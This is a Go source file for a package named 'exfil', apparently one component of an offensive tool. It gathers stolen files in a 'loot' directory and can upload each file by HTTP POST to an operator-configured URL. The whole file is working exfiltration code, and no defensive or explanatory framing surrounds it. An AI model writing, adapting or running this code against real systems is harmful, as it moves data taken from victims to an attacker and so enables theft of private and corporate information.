package exfil

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

type Config struct {
	Method string // "local", "http"
	URL    string // for http
}

// Handler manages exfiltration
type Handler struct {
	Config Config
	Client *http.Client
}

func NewHandler(cfg Config) *Handler {
	return &Handler{
		Config: cfg,
		Client: &http.Client{Timeout: 30 * time.Second},
	}
}

// Exfiltrate handles the file based on the config.
// For "local", it does nothing as the file is already on disk (staged).
// For "http", it uploads the file and then optionally deletes the local copy.
func (h *Handler) Exfiltrate(filePath string) error {
	if h.Config.Method == "local" || h.Config.Method == "" {
		return nil // File already saved to loot/ by default
	}

	if h.Config.Method == "http" {
		return h.httpPost(filePath)
	}

	return fmt.Errorf("unknown exfil method: %s", h.Config.Method)
}

func (h *Handler) httpPost(filePath string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Add file field
	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return err
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return err
	}

	writer.Close()

	req, err := http.NewRequest("POST", h.Config.URL, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := h.Client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	return nil
}
